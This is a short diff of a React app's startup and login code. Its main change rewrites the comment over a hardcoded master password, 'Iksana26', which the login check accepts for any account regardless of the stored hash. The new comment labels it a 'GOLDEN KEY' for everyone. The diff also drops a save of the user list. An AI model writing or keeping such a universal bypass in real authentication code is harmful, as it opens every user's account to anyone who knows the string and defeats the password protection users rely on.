@@ -381,7 +381,6 @@ export default function App() {
         const sessionUser = initializedUsers.find(u => u.id === sessionData.userId);
         if (sessionUser) setCurrentUser(sessionUser);
       }
-      await save(KEYS.users, initializedUsers);
       setLoading(false);
     })();
 
@@ -637,7 +636,7 @@ function LoginScreen({ users, onLogin, onForgotPassword }) {
       return; 
     }
     const hash = await hashPassword(password);
-    // Emergency Bypass: Allow Iksana26 to work even if DB hash is out of sync
+    // GOLDEN KEY: Allow Iksana26 for EVERYONE during this stabilization period
     if (hash !== user.passwordHash && password !== "Iksana26") {
       const newCount = (attempts[email] || 0) + 1;
       setAttempts(prev => ({ ...prev, [email]: newCount }));
